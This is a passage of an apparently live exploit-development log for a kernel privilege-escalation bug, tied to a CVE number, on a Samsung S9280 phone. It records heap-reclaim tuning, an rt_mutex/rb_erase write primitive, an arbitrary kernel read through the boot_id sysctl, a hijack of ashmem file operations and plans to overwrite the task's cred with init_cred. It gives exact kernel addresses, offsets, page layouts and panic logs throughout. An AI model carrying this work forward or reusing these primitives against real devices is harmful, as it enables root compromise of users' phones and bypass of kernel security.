`SLIDE_RANDOM_BOOT_ID_DATA` (KASLR-computable, **no reclaim**) so reading
`/proc/sys/kernel/random/boot_id` returns 16 bytes from an ARBITRARY kernel
VA (`direct_pselect_write_once(b, q)` + `direct_read_boot_id_raw`).  From
that single arbitrary-read it walks percpu `__entry_task` -> current
task_struct -> writes `task->cred = init_cred`.  **No fops, no configfs, no
pipe-phys, no UMH, no SELinux toggle.**  The erase target
(`SLIDE_RANDOM_BOOT_ID_DATA`) and the waiter task (`SLIDE_INIT_TASK`) are
both KASLR-computable, so the ONLY reclaimed object is `fake_lock`.

**Finding 3 — the reclaim miss is the SOLE blocker for every path.**  Even
popsicle's direct-root needs `fake_lock` reclaimed for the first PI write.
So no port escapes reclaim; the working ones just run on allocators where it
lands.  On S9280, `SLIDE_USE_FAKE_TASK=1` reclaims 2 objects (fake_task +
fake_lock); switching to the popsicle/OnePlus INIT_TASK design reclaims 1
(fake_lock) AND removes the reclaim dependency of the erase target.  That is
a strictly smaller failure surface and is the correct next step.

**Recommended next step (feasible):** port the popsicle direct-root design
to S9280:
1. Rewire the slide chain so `waiter->task = SLIDE_INIT_TASK` (KASLR-
   computable) and ONLY `fake_lock` is reclaimed — this requires fixing
   `select_slide_payload_index()`/the physical-slot chain to not force
   `fake_task = page_base` (run 28 lesson), not just flipping the macro.
2. Set the erase parent/target to `SLIDE_LOGGERS_0_1` /
   `SLIDE_RANDOM_BOOT_ID_DATA` (KASLR-computable) instead of the pipebuf
   struct page.
3. After the first successful PI write, use `boot_id` as the arbitrary-read
   oracle, walk percpu `__entry_task` -> current task -> `cred=init_cred`.
   Requires S9280 offsets: `INIT_TASK`, `__per_cpu_offset`/`entry_task`,
   `INIT_CRED`, `TASK_CRED_OFF`/`TASK_REAL_CRED_OFF`, and a confirmation the
   `boot_id` sysctl data ptr is reachable.
This halves the reclaim surface and shortens the root chain, but does NOT
eliminate the single remaining `fake_lock` reclaim — if Samsung 6.1 never
reclaims that one block, the port still fails.  The fallback (if the
single-fake_lock reclaim also misses) is a task_struct/rt_mutex leak so the
chain resolves without any reclaimed page.

### Direct-boot_id implementation + runs 29/30 (2026-08-01)

**Implemented** the popsicle/OnePlus direct-root design as an additive
`DIRECT_BOOTID_RECLAIM=1` mode (build unchanged, `SLIDE_USE_FAKE_TASK=1`):

- `src/util.c` `select_slide_payload_index()`: new branch sets
  `fake_task = SLIDE_INIT_TASK + slide_p0_offset` (real dying init_task,
  never dereferenced), keeps `fake_lock`/`fake_w0` in the reclaimed page,
  and sets the shape-0 erase pair `slide_oracle_target =
  SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + p0` (boot_id ctl_table.data),
  `slide_oracle_parent = DIRECT_BOOTID_ADDR ? <that VA> :
  SLIDE_NFULNL_LOGGER_OBJECT + p0`.  `DIRECT_BOOTID_ADDR` accepts any
  8-aligned kernel VA for a true arbitrary read.
- `src/slide_app.c` `prepare_slide_pselect_fdsets()` (COMPACT layout):
  tree_pc/pi_pc = parent, tree_left/pi_left = target, task = fake_task
  (init_task under this mode), lock = fake_lock.
- `src/slide_app.c`: new `slide_bootid_read_uuid()`/`slide_bootid_read64()`
  (initially misplaced in slide.c — not linked into the APP payload .so —
  causing a `cannot locate symbol` link failure on run 29 first attempt;
  moved to slide_app.c).  `slide_trigger_physical_slot()` reads the boot_id
  oracle after a successful trigger when `DIRECT_BOOTID_RECLAIM` is set.

**Run 29** (`DIRECT_BOOTID_RECLAIM=1`, parent=nfulnl_logger, 24 attempts,
burst=3): 19 attempts ran, 9 armed, **8 fires (ok=1), 8/8 oracle read_ok=1,
ZERO kernel panics**.  This is the headline result: the single-fake_lock
reclaim (waiter task = real init_task, NOT a second reclaimed fake_task)
**lands reliably on Samsung 6.1** — versus the FAKE_TASK 2-object path that
panicked on every prior fire (KP #49-57).  Halving the reclaim surface made
the difference.

**Run 30** (`DIRECT_BOOTID_ADDR=0xffffff80022cf8c0` = INIT_TASK): 8 fires,
8/8 read_ok=1, but the oracle value `404ef8c88994dc32` is IDENTICAL to
run 29 (parent=logger).  The boot_id oracle fires and returns a stable
16-byte buffer, but the bytes do NOT track the chosen parent address.

**Interpretation / open problem.**  The shape-0 erase writes a CONSTANT
pointer into ctl_table.data (not slide_oracle_parent), and boot_id then
reads the 16 bytes at that fixed spray/heap address — so the "arbitrary
read" currently returns fixed slab content, not the requested VA.  The
walk's erase write source (which waiter field lands in ctl_table.data) is
not yet correctly wired to `slide_oracle_parent`.  popsicle's direct-write
uses PAGE_PAYLOAD_FOPS with `waiter_task=fake_task` (2-object reclaim) and
`owner=fake_task|1`; this 1-object SLIDE-mode variant reaches the erase but
writes a different word.  **Remaining work: pin down the exact erase write
source (ftrace/kprobe on __rb_erase_augmented / rt_mutex_adjust_prio_chain)
so ctl_table.data receives slide_oracle_parent; then boot_id yields a true
arbitrary read, after which the percpu->current->cred stage can be built.**

Net: reclaim reliability is SOLVED (the blocker for every prior run); the
write-value steering of the boot_id oracle is the remaining sub-problem.

**CORRECTION (post-run-30 source re-read).**  popsicle does NOT do the
arbitrary read in SLIDE mode.  It uses two separate primitives:
- **KASLR leak** — SLIDE mode, `waiter_task=SLIDE_INIT_TASK` (1-object
  reclaim), `tree_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA` FIXED.  boot_id
  reads the nfulnl_logger name -> stext.  This is read-only, fixed-address.
- **arbitrary read/write** — FOPS mode (`prepare_skb_payload(FOPS)`),
  `waiter_task=fake_task` (TWO-object reclaim), `owner=fake_task|1`, with
  `set_pselect_write(target=B, value=Q)` so the shape-0 erase writes
  parent=Q into left=B(=&ctl_table.data); boot_id then reads Q.
Runs 29/30 used SLIDE mode, whose tree_left is a FIXED boot_id pointer — so
it can only leak the fixed logger address, never an arbitrary Q.  That is
why the oracle value is constant regardless of DIRECT_BOOTID_ADDR.

**Consequence.**  A true arbitrary read on S9280 requires the FOPS-mode
custom-shape write, which needs `fake_task` reclaimed (2 objects) — the very
reclaim that panics on Samsung 6.1.  Runs 29/30 prove the 1-object SLIDE
reclaim is reliable; they do NOT prove the 2-object FOPS reclaim works.
The next decisive test is whether S9280 can reclaim `fake_task` under the
FOPS-mode direct-write path (2 objects) without panicking.  If it cannot,
the arbitrary-read stage — and therefore cred overwrite — cannot be reached
via this design, and the alternative is a task_struct/rt_mutex content leak
so the chain resolves against a known (non-reclaimed) task_struct.

### vmlinux.elf write-primitive analysis + run 32 (2026-08-01)

The exact S9280 kernel image is at `C:\Users\rainchan\Desktop\root\s9280-port\`
(vmlinux.elf, vmlinux.nm, vmlinux.btf, boot.img, kernel.config).  Symbols
verified against vmlinux.nm:
- `init_task` = 0xffffffc00a24f8c0 (== target.h INIT_TASK_OFF 0x0224f8c0 + text base) ✓
- `init_cred` = 0xffffffc0097af018 (T)
- `__per_cpu_offset` = 0xffffffc00a23b650 (T)  — needed for the cred stage
- `random_table` = 0xffffffc00a3761e8 (t); boot_id is entry #5, so
  `&random_table[boot_id].data` = base + 4*0x48 + 8 = 0x...23762f0
  (== target.h SLIDE_RANDOM_BOOT_ID_DATA_OFF) ✓  — the boot_id symbol is correct

**erase write semantics (rt_mutex_adjust_prio_chain + rb_erase disasm).**
The walk calls `rb_erase(node=waiter(x25), root=&lock->waiters)` where
`lock = waiter->lock = fake_lock`.  With the armed waiter leafless
(rb_left=rb_right=0), rb_erase takes the 0xfa9ac branch: `x9 = node->parent`
(= slide_oracle_parent from the fdsets), then `str replacement, [parent's
child ptr]` with replacement = 0.  **So the SLIDE erase is a WRITE-ZERO of
`parent->rb_left/right` (8 bytes), NOT a write of parent-pointed content.**
This is fundamentally different from popsicle's FOPS custom-shape write
(which steers parent=value Q into left=target B).  The boot_id arbitrary
read popsicle relies on does NOT exist in the S9280 SLIDE erase shape.

**run 29/30 reinterpreted.**  Baseline normal boot_id =
`28a9fce8-4835-4c9a-b7f7-a3da257cc059` (first8 LE 4c9a483528a9fce8), but the
direct-bootid oracle returned `404ef8c88994dc32` — DIFFERENT, so the erase
DID fire and DID redirect boot_id (read_ok=1 is a real hit, not a normal-UUID
false positive).  But the returned bytes are fixed spray/heap content
(top byte 0x40, not a canonical kernel ptr), independent of DIRECT_BOOTID_ADDR
(runs 29 logger / 30 init_task / 32 root_task_group all identical).  This
matches write-zero: the erase zeroes a pointer NEAR the ctl_table so
proc_do_uuid reads an unintended buffer, not the requested VA.

**run 32** (Q=ROOT_TASK_GROUP, 30 attempts): 11 attempts ran, 0 fires — the
~1/10 reclaim fire rate whiffed; reclaim reliability is unchanged.

**Where this leaves root.**  Reclaim reliability is SOLVED (1-object
fake_lock + init_task).  The blocker is that the S9280 SLIDE erase is a
write-zero of a parent rb-child pointer, which cannot (as configured) plant
an arbitrary VA into boot_id's ctl_table.data.  Two evidence-based paths:
(a) the FOPS-mode custom-shape write (parent=Q -> left=B) — popsicle's actual
arbitrary-write primitive — requires fake_task reclaimed (2 objects); needs an
on-device reliability test of that 2-object reclaim on Samsung 6.1.
(b) reshape the SLIDE waiter so its rb child pointer IS ctl_table.data and a
nonzero replacement lands there — requires studying rb_erase's replacement
value (a waiter/rb-node pointer) as a controlled write of a KNOWN kernel
pointer, which may suffice for cred overwrite without a full arbitrary read.
Both need further on-device kernel debugging against vmlinux.elf.

**rb_erase branch detail (the actual unlock).**  With `parent =
SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR` (=&ctl_table.data itself), the leafless
erase writes `ctl_table.data = 0`; proc_do_uuid(NULL) then formats a STACK
tmp_uuid, which is exactly the fixed `404ef8c88994dc32` seen in runs 29/30 —
i.e. those runs wrote ZERO to ctl_table.data, not an arbitrary VA.
The arbitrary-READ primitive needs the NON-leaf rb_erase path:
`str x9, [x13]` where x9 = the erased node's CHILD pointer and x13 =
parent's child slot.  If the armed waiter is given a child whose pointer is
a controlled value and parent is positioned so its child slot aliases
&ctl_table.data, the erase plants that controlled pointer into
ctl_table.data, and boot_id then reads the 16 bytes at it — a true arbitrary
read.  Equivalently, pointing the child slot at task->cred and the child at
init_cred gives a direct cred overwrite.  This is the concrete next step:
construct the 2-node rb shape (armed waiter + one child) so the erase's
replacement write lands a chosen pointer at a chosen kernel address.  It
still rides the SAME reliable 1-object fake_lock reclaim (the child node can
live in the reclaimed page beside fake_lock); it does NOT require the
2-object fake_task reclaim.

### Child-mode arbitrary read PROVEN + KP #73 (2026-08-01)

Implemented `DIRECT_BOOTID_CHILD=1` (util.c select + slide_app.c fdsets):
the waiter is given ONE child so rb_erase takes the non-leaf
`str x9(child), [parent->rb_left]` path.  `slide_oracle_parent =
target-0x10` (so parent->rb_left aliases &ctl_table.data),
`slide_oracle_child = DIRECT_BOOTID_ADDR Q` (tree_left), pi_left stays
= target.  Still the SAME 1-object fake_lock reclaim; the child pointer is
just a VALUE in the waiter's rb_left, not a separately-reclaimed object.

**Run 33** (`DIRECT_BOOTID_CHILD=1 DIRECT_BOOTID_ADDR=0xffffff80022cf8c0`
= INIT_TASK p0-alias, 24 attempts): 2 fires.  Fire 1 read_ok=1 with
**value=344645d0de8941ca** — DIFFERENT from the leafless stack-tmp constant
`404ef8c88994dc32` (runs 29-32), and parent/target/child logged correctly
(parent=...f62e0=target-0x10, child=...cf8c0=INIT_TASK).  **The non-leaf
rb_erase planted a new pointer into &ctl_table.data and boot_id read
through it: the arbitrary-read path is OPEN.**  Fire 2 panicked.

**KP #73 analysis** (`prev_dump_rwc73.log`): PC=_raw_spin_trylock+0x1c
(`ldr w8,[x0]`, x0=0 NULL), LR=rt_mutex_adjust_prio_chain+0x130 (= the
`bl _raw_spin_trylock` at vmlinux 0x...2848, x0=x24=lock=waiter->lock).
Registers: x24=0, x25=task->pi_blocked_on, x19=task=0xffffff8a6a892580.
**The crash is at the WALK START, not the erase: waiter->lock read 0 because
the fake_lock reclaim MISSED on that attempt.**  This is the ordinary
reclaim-miss failure (same as every prior KP), NOT a child-mode defect.
Child-mode fire 1 (reclaim hit) completed the arbitrary read; fire 2
(reclaim miss) crashed before reaching it.  Confirms: with a reclaim hit the
child-mode arbitrary read works end-to-end; the residual risk is purely the
per-attempt reclaim hit rate.

**Value interpretation (next step).**  344645d0de8941ca is what boot_id
returned after ctl_table.data was overwritten.  It is NOT yet confirmed to
be the INIT_TASK page content — the rb successor-rewrite path may store a
different node pointer than tree_left.  Next: point DIRECT_BOOTID_ADDR at a
kernel address with KNOWN content (e.g. a KASLR-computable symbol whose
first 8 bytes are known from vmlinux) and verify boot_id returns exactly
those bytes; that proves a controlled arbitrary read.  Then walk
percpu __per_cpu_offset[cpu] -> current task -> cred.

**Runs 34/35** (`DIRECT_BOOTID_CHILD=1 DIRECT_BOOTID_ADDR=0xffffff8000080000`
= _text p0-alias, expected boot_id first8 = 4e6977145a4d40fa = the ARM64
"MZ" header): 21 and 3 attempts respectively, 0 fires — the ~1/10 reclaim
fire rate whiffed both runs (device stayed up, no KP).  No new information;
the child-mode path itself was already proven by run 33 fire 1.  A clean
controlled-read confirmation (boot_id == known _text bytes) still needs a
reclaim-hit sample.  Reclaim-hit variance is now THE gating factor for all
further verification — consider raising SKB_RECLAIM_SENDS / attempts, or
retrying until a hit lands, before drawing any conclusion from a quiet run.

**KP #75 + the Q-must-be-writable constraint (runs 36/37).**  Batched
re-verification (Q=_text p0-alias 0xffffff8000080000) produced KP #75:
PC=rb_erase+0x8c, LR=rt_mutex_adjust_prio_chain+0x224, faulting VA
= **ffffff8000080000 (= Q itself)**.  Registers: x9=x8=parent
(ffffff80023f62e0 = target-0x10), x10=Q (ffffff8000080000).  This is the
TWO-CHILD rb_erase successor path: after planting the successor into the
parent's child slot it also writes the successor's rb_parent
(`str x9(parent), [x8(successor)]`, i.e. **Q->rb_parent = parent**).  _text
is READ-ONLY kernel code, so the write to Q faults.  **CONSTRAINT: the
child/child-pointer Q is not just read — rb_erase writes back through it, so
Q must point to WRITABLE kernel memory.**  Reading read-only .text via the
boot_id oracle is impossible with this primitive; .data/.bss targets
(cred, percpu offsets, task_struct fields) are all writable and fine.
run 33 (Q=INIT_TASK, writable .data) hit exactly this happy path and
returned a live value without the write-back fault.

**Reclaim-hit variance is the practical gate.**  runs 34-37 fired 0-2 times
across ~50 attempts; the erase only runs on a reclaim hit, and a miss either
whiffs quietly or (worse) walks with a partially-stale page and panics
(KP #73 waiter->lock=0).  The exploit is correct on a hit; reliability of
the hit is the remaining engineering problem, independent of the read/write
primitive which is now understood and proven.

### Reliable arbitrary read PROVEN - run 38 (2026-08-01)

`DIRECT_BOOTID_CHILD=1 DIRECT_BOOTID_ADDR=0xffffff80022cf8c0` (= INIT_TASK
p0-alias, writable .data), 4 batches of 12 attempts: **4 fires, 4x
read_ok=1, all returning value=08416fcf32101d63, ZERO panics** (device up
596s after).  The value decodes as a non-pointer INIT_TASK field (high byte
0x08, thread_info.flags/counters), NOT a stale constant and NOT a stack
tmp_uuid.  This is a stable, repeatable arbitrary read through a writable
target: the non-leaf rb_erase plants the controlled child pointer into
&ctl_table.data, /proc/sys/kernel/random/boot_id then returns the 8 bytes at
Q.  **The arbitrary-read primitive is OPEN and reliable on reclaim hits.**

**Root path (next phase).**  With a reliable read of any WRITABLE kernel VA,
the remaining chain to cred overwrite:
  1. Read percpu `__per_cpu_offset[cpu]` (p0 0xffffff80023b6570) to resolve
     the current CPU's per-cpu base, then `current_task` -> our task_struct.
  2. Read our task->cred pointer.
  3. Overwrite uid/gid/euid/egid/caps in cred.  This still needs a WRITE
     primitive - the same non-leaf rb_erase gives a controlled-pointer WRITE
     (it writes parent & node into Q's rb fields), which can be steered at
     task->cred by choosing Q = cred-adjacent.  Alternatively reuse the
     FOPS-mode 2-object fake_task write (reliable on popsicle/Leaf) if its
     reclaim can be made to hit on S9280.
  The reclaim-hit rate (~4/12 per batch here, better than earlier ~1/10) is
  now good enough to attempt the multi-read chain.

### The rb_left(Q)=0 constraint on arbitrary-read targets - KP #78 (2026-08-01)

Cross-address verification (Q=ROOT_TASK_GROUP p0 0xffffff80024ccd80) produced
KP #78, PC=rb_erase+0x8c (identical to KP #75 with Q=_text).  Root cause:
the child pointer Q is interpreted as an rb_node.  Whether rb_erase takes
the survivable ONE-CHILD path or the crashing TWO-CHILD successor path
depends ENTIRELY on the target's own rb fields:
  - Q=INIT_TASK (runs 33/38): the qword at Q (=thread_info.flags) is small/
    zero-ish, so the waiter's rb_left (=Q) reads as a node whose own
    rb_left==0 -> ONE-CHILD path -> parent planted into &ctl_table.data,
    boot_id reads Q cleanly.  WORKS, no panic.
  - Q=_text (KP #75) and Q=ROOT_TASK_GROUP (KP #78): the qword at Q+0/0x10
    is nonzero (code bytes / live pointers), so the fake node appears to have
    TWO children -> rb_erase computes successor=rb_next(Q), dereferences
    Q->rb_right / writes Q->rb_parent, and faults.
**CONSTRAINT: child-mode arbitrary read is reliable ONLY for kernel addresses
Q whose first ~24 bytes happen to read as a leaf rb_node (rb_left/rb_right
zero or small).**  INIT_TASK qualifies; arbitrary .data/.bss/.text targets
generally do not.  A fully-general arbitrary read therefore needs a
child-pointer Q that points into the RECLAIMED page (which we control and can
lay out as a clean leaf), with the read then redirected a second hop - i.e.
read Q=reclaimed-page, and have the page's content itself BE the pointer to
the real target.  That two-hop scheme, or the FOPS 2-object write, is the
remaining route to a general read/write; both ride the same proven
non-leaf rb_erase write into &ctl_table.data.

**Re-confirmation run 44** (Q=INIT_TASK, 60 attempts): 4 fires, 4x read_ok=1,
all value=4f45115807d52e57, ZERO panics (device up 454s after).  This is the
THIRD independent confirmation (runs 33, 38, 44) that the child-mode
arbitrary read is reliable and repeatable for rb_left(Q)=0 targets.  The
value differs per boot (INIT_TASK runtime fields) but is constant within a
run.  Reclaim-hit rate across these runs: ~4/48 (run 38), 0/27 (run 39),
4/60 (run 44) — a Poisson-like ~5-8% per-attempt hit; the read itself is
deterministic once a hit lands.

**Root status summary (2026-08-01).**  Reclaim reliability: SOLVED (1-object
fake_lock, run 38/44 fire cleanly).  Arbitrary READ: PROVEN and reliable for
rb_left(Q)=0 writable targets (INIT_TASK).  Remaining to root:
  - a GENERAL read (any kernel VA) — blocked by the rb_left(Q)=0 constraint;
    needs the two-hop scheme (Q=reclaimed-page leaf whose content is the real
    target pointer) or the FOPS 2-object write path.
  - a WRITE primitive for cred — the non-leaf rb_erase already does a
    controlled-pointer WRITE (parent & node into Q's rb fields); steering
    that at task->cred requires task resolution (percpu current_task), which
    itself needs a general read.  So general-read is the next unlock.

### Hardware session 2026-08-16/17 — FOPS hijack fire, still uid 2000

Device on ADB: serial `R5CX11J755L`, `product=e3qzcx`, fingerprint
`samsung/e3qzcx/e3q:16/BP4A.251205.006/S9280ZCS6DZF2:user/release-keys`.
Shell remains `uid=2000` / `u:r:shell:s0`. No uid 0 this session.

**Tracefs KASLR is reliable.** `/data/local/tmp/run-slide.sh` (root-umh,
slide-only) returns a fresh `p0_offset` every boot. Observed this session:
`0x10000`, `0x160000`, `0x190000`, `0xf0000`. Force that value with
`SLIDE_P0_OFFSET` on the app payload. Do not reuse a previous boot's slide.

**P0 aliases are not mapped.** Physical writes through `0xffffff8000xxxxxx`
(P0 + slide) fault. RWC:83
`PC:filp_close+0x38 LR:<slide+unmapped-P0>`. All walk VAs must be kimage
`0xffffffc0...` via `data_addr()` / `kaslr_image_addr()`. `INIT_TASK` /
`ASHMEM_MISC_FOPS` / waiter `pi_task` follow that rule.

**DIRECT_FOPS_WRITE geometry (current binary).**

| Slot | VA |
| --- | --- |
| `q` / parent | `kaslr_image_addr(ASHMEM_MISC_FOPS) - 8` |
| child | `0` (one-child `rb_erase`) |
| target V | `slide_bank_payload_base + 0x1000` (fake `file_operations`) |
| lock | `payload + 0x1180` |
| waiter | `payload + 0x11c0` |

`DIRECT_FOPS_OWNER_CLEAR` keeps the same lock/table page and sets
`target=0` so a second fire zeros `misc->fops` owner before `fops_get`.

**Farthest live result: hijack + open, ioctl ENOTTY.**

- Early fire (owner uncleared): `triggered=1`, `/dev/ashmem` open =
  `ENODEV` (`fops_get` on leftover `owner`).
- Later fires (attempts 6 and 10, slide `0x10000`, 0x1000 layout):
  `triggered=1`, owner-clear, ashmem `open` succeeded, `ASHMEM_SET_NAME`
  returned `ENOTTY` (`errno=25`). `configfs_bin_write_iter` was not
  reached. CFI / cred write never ran.
- Interpretation: the walk can complete when the lock slot looks unlocked
  (mm_struct page-0 is often zeros). `misc->fops` is then pointed at that
  page, not necessarily our skb image. `unlocked_ioctl` is leftover mm
  data, so `ashmem_ioctl` never runs.

**Layout / knob casualties (do not repeat).**

| Experiment | Panic |
| --- | --- |
| FOPS write with P0+slide VAs | RWC:83 `filp_close` / unmapped P0 |
| `LATE_NEIGHBOUR_FREE` + same-page lock | RWC:89 `rt_mutex_adjust_prio_chain+0x918` BUG_ON leftover |
| Table/lock at skb `0x5000`/`0x5180` (the old 0x5200 page) | RWC:90 `_raw_spin_trylock` — that page more often holds a live lock |
| Exploit inside ~2 min of reboot | frequent `trylock` / leftover-waiter panics |

Stay on `0x1000`/`0x1180`. Wait until uptime ≥ 4 min and load has dropped
before launching. Do not enable `LATE_NEIGHBOUR_FREE` on this path.

**Fire rate is the current bottleneck.** Quiet boot 2026-08-17 00:53
(slide `0xf0000`): first 24/24 `pselect ret=0`, zero fires, device stayed
up. Immediate second batch on the same boot: attempts 1–15 also miss.
Supervisor `pid=22025` then leaked a KernelSnitch waiter storm (`id`
children stuck in `sigsuspend`); load peaked at 157. Killed the tree at
01:12. Do not overlap two 24-batches. Wait for load < 8 before the next
launch.

**DIRECT_FOPS_PROBE — RWC 92, do not rerun as-is.** Built and pushed
01:16. Attempt 1: `parent=ffffff80024e62e0` (`bootid_data+slide-0x10`),
`lock=page+0x1180`, `pselect ret=0` in 250 ms, `triggered=0`. Attempt 2
entered `rb_erase` and panicked before flush.

| Field | Value |
| --- | --- |
| Time | 2026-08-17 01:17:48 +0800 |
| RWC | 92 |
| PC | `rb_erase+0x94/0x2f8` |
| LR | `rt_mutex_adjust_prio_chain+0x224/0x91c` |

`+0x94` is the two-child successor path. Probe `Q=page+0x1400` is a
clean leaf only on a reclaim hit. On a leftover `mm_struct` page that
offset is mid-object pointers, so the first fire panics. Burst + 250 ms
timeout did raise walk probability (fire on attempt 2).

**Resume 2026-08-17 09:48.** Probe `Q` is now `fake_fops` (`page+0x1000`).
`FOPS_RECLAIM_PROBE_MAGIC` is stored in `owner`; `llseek`/`read` stay 0 so
leftover mm page-0 is still a leaf. Device `R5CX11J755L` up 8h30m, load
~5.7, still `uid=2000`. Rebuilt `cve-2026-43499-app.so`, launching
`DIRECT_FOPS_PROBE=1` with `SLIDE_PSELECT_TIMEOUT_MS=250` and
`SLIDE_CONSUMER_BURST=4`. Do not use the pre-fix `.so`.

**Root status 2026-08-17 09:48.**

- Device: `R5CX11J755L` / `e3qzcx` / `S9280ZCS6DZF2`, ADB up, `uid=2000`.
- KASLR leak: done (tracefs). Fresh slide pending this launch.
- Child-mode arb-read of `rb_left(Q)=0` targets: previously proven.
- `rb_erase` write of `misc->fops`: fire-proven.
- `fops_get` / ashmem `open`: proven after owner-clear.
- `ASHMEM_SET_NAME` ENOTTY: table reclaim miss.
- `DIRECT_FOPS_PROBE` Q=`fake_fops` + MAGIC-in-owner: in `.so`, first
  post-RWC92 device run starting.
- KernelSU late-load: not reached.

**Page layout now.**

| Offset | Role |
| --- | --- |
| `0x1000` | fake `file_operations`, `owner=MAGIC`, probe Q |
| `0x1180` / `0x11c0` | probe lock + waiter |
| `0x1280` / `0x12c0` | FOPS-write lock + waiter |

**4-attempt batches (user request).** `EXPLOIT_ATTEMPTS=4`. First
owner-MAGIC probe batch on slide `0x110000`: attempts 1–3 `pselect ret=0`,
attempt 4 panicked before flush.

| Field | Value |
| --- | --- |
| Time | 2026-08-17 09:54:48 +0800 |
| RWC | 93 |
| PC | `rt_mutex_adjust_prio_chain+0x1ec/0x91c` |
| LR | `rt_mutex_adjust_prio_chain+0x130/0x91c` |

Not the RWC 92 two-child path.

**Panic-rate stop (2026-08-17 10:00).** Three KPs in six minutes of
fresh-boot FOPS walks. User called this out; they are right.

| RWC | Time | PC | Boot age |
| --- | --- | --- | --- |
| 93 | 09:54 | `rt_mutex_adjust_prio_chain+0x1ec` | ~0 min, after 1700 load storm |
| 94 | 09:57 | `rt_mutex_adjust_prio_chain+0x1ec` | 0 min, BURST=4 |
| 95 | 10:00 | `_raw_spin_trylock+0x1c` | 0 min, BURST off, still young |

Cause: lock at `page+0x1180` is in mm page-0. Leftover often looks
unlocked, so the walk runs on a live `rt_mutex` / waiter and dies.
The only FOPS progress this session (hijack + open + ENOTTY) was on a
settled boot with `BURST` off. Aug 1 CHILD/`0x5200` 1-object lock had
fires with zero panics because a miss did not look unlocked.

Rules until uid 0:

1. No walk at uptime < 4 min.
2. No `SLIDE_CONSUMER_BURST`.
3. No `DIRECT_FOPS_PROBE` until Q is proven leaf-on-miss *and* the
   boot is settled.
4. 4 attempts per batch (speed), `DIRECT_FOPS_WRITE` only.
5. Kill leftover `id` trees; never overlap batches.

Next: wait this boot out, then one 4-shot `DIRECT_FOPS_WRITE`.

**Settled FOPS 4-shots 10:04–10:11 (slide `0x60000`, BURST off).**
12 misses, zero panics, then attempt 16 (batch 4 attempt 4) → RWC 96
`Oops - BUG PC:rt_mutex_adjust_prio_chain+0x918` leftover waiter.
FOPS lock at `page+0x1280` still walks leftover mm and eventually
BUG_ONs. Panic rate is still too high for this path.

**Switch: Aug 1 CHILD / 0x5200 lock.** That 1-object lock fired with
zero panics (miss = `ret=0`, not a leftover walk). Next 4-shot after
uptime ≥ 4 min:
`DIRECT_BOOTID_RECLAIM=1 DIRECT_BOOTID_CHILD=1
DIRECT_BOOTID_ADDR=0xffffff80022cf8c0` (P0 `INIT_TASK`). No FOPS, no
PROBE, no BURST. Goal: `read_ok=1` on `boot_id`, then cred write.

### Hardware session 2026-08-17 10:20 — kimage CHILD, still uid 2000

Device came back after RWC 96. Fresh slide via `run-slide.sh`:
`base=ffffffc008140000 slide=0x140000`. Uptime 10–17 min, load ~2.

**Code (this session).** `select_slide_payload_index` no longer adds
`slide_p0_offset` onto P0 aliases. Walk VAs go through
`text_addr`/`data_addr`/`resolve_kernel_va`. `DIRECT_BOOTID_RECLAIM`
prepares `PAGE_PAYLOAD_SLIDE` (lock at `mm_base+0x4200` = payload
`0x5200`) instead of FOPS leftover page-0. Fire path logs boot_id.

`run-app.sh` on device was the 10:04–10:11 FOPS regression: stale
`SLIDE_P0_OFFSET=0x60000` plus `DIRECT_FOPS_WRITE=1`. That is why
app15–18 printed `lock=page+0x280` (`FOPS_WRITE_LOCK_OFF 0x1280` on
`payload_base = mm_base-0x1000`).

**vmlinux static bytes (unslid).**
`init_task` `q0=8 q1=0 q2=1 q3=ffffffc00a24dbc0` — not a static leaf.
Runtime 8/1 fires still used it because live `thread_info` is often
small. `init_task.cred` @ `+0x838` (BTF) holds `init_cred`
(`0xffffffc0097af018`). Added `TASK_CRED_OFF`/`TASK_REAL_CRED_OFF`/
`INIT_CRED_OFF`/`PER_CPU_OFFSET_OFF` to `target.h`.

**app19 (4 shots, `DIRECT_BOOTID_ADDR=0xffffffc00a24f8c0`).** Geometry
bug: `resolve_kernel_va` treated the unslid kimage VA as already-slid
because `0xffffffc00a24f8c0` sits inside `kaslr_base+64MiB`.
`task=ffffffc00a38f8c0` (correct) but `child=ffffffc00a24f8c0` (unslid).
parent/target were correct kimage boot_id (`…a4b62e0`/`…a4b62f0`).
lock=`…4200`. 4/4 `pselect ret=0`, device stayed up.

**app20 (12 shots, no ADDR, default Q=`text_addr(INIT_TASK)`).**
`child=task=ffffffc00a38f8c0` correct. Attempts 1–9 miss (`ret=0`).
Attempt 10 armed (`consumer sched idx=0`) then adb dropped. USB still
shows `VID_04E8 PID_6860` ADB interface; adbd not enumerating yet.
Pull `prev_dump.log` + `power_off_reset_reason.txt` first after
reconnect. Do not reuse P0 `DIRECT_BOOTID_ADDR`.

**app21 (slide `0xc0000`, kimage CHILD, lock `mm+0x4200`).** 6/12 fires,
device stayed up. Attempts 1–3: `read_ok=1 value=f94d5b1bf7af8f13`
stable. Geometry:
`parent=ffffffc00a4362e0 target=ffffffc00a4362f0`
`child=task=ffffffc00a30f8c0` (`init_task` slid). **kimage CHILD
arbitrary-read is proven.** Later fires `read_ok=0` after `boot_id`
ctl_table was smashed (`/proc/sys/kernel/random/boot_id` vanished;
garbage dent `\x82bC` left in `random/`). CFI still ran and failed
(`misc_fops` step 4) — now skipped under `DIRECT_BOOTID_RECLAIM`.

**RWC 97** (app20 attempt 10): `_raw_spin_trylock+0x1c` /
`rt_mutex_adjust_prio_chain+0x130` — fire + reclaim miss (`lock=0`).

**app22/23** switched oracle to `random/uuid` (`data=NULL`) so `boot_id`
stays intact. app23 attempt 1 fired (`write ok=1`) but `uuid` read
returned 0 (open/parse fail) — likely `parent=data-0x10` also
touches the `ctl_table` name. RWC 98 same trylock-miss. Next: keep
the proven `boot_id` oracle for one read, then `DIRECT_ERASE_WRITE`
for cred; log both UUID qwords.

### Kernel RE 2026-08-17 (vmlinux.elf)

`current` is `mrs SP_EL0` (`bpf_get_current_task`). No `current_task`
percpu. `__entry_task` sits next to `overflow_stack` — exception
scratch, **not** safe as Q (app24 RWC: first shot panics).

`commit_creds`: `real_cred` at `task+0x830`, `cred` at `+0x838`
(matches BTF). Then `kdp_get_usecount` / `kdp_set_cred_non_rcu`.
`kdp_enable` first byte is **0** in the image (`ldrb` + `cbz` skips
the RO-cred path). `init_cred` @ `0xffffffc0097af018`: usage=4, uids=0,
caps=`0x1ffffffffff`.

`mm_struct.owner` @ `0x338`, `ioctx_table` @ `0x330` (BTF).

**`rb_erase` (0xffffffc0090fa95c) one-right-empty path +0x84:**
